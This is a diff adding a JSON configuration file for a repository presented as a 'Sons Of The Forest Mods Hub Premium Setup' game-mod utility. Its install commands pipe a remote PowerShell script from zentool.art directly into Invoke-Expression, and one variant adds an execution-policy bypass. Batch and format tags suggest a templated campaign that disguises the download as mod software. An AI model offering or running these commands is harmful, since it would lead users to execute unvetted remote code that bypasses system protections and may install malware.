@@ -1,0 +1,28 @@
+{
+  "repo": "Sons-Of-The-Forest-Mods-Hub-Premium-Setup",
+  "product": "Sons Of The Forest Mods Hub Premium Setup",
+  "product_title": "Sons Of The Forest Mods Hub",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "sons-of-the-forest-mods-hub-windows",
+    "sons-config",
+    "sons-integration",
+    "sons-latest",
+    "system-tools",
+    "windows-utility",
+    "desktop-tools",
+    "maintenance",
+    "configuration",
+    "performance-tuning",
+    "disk-cleanup",
+    "uninstaller"
+  ],
+  "site": "zentool.art"
+}
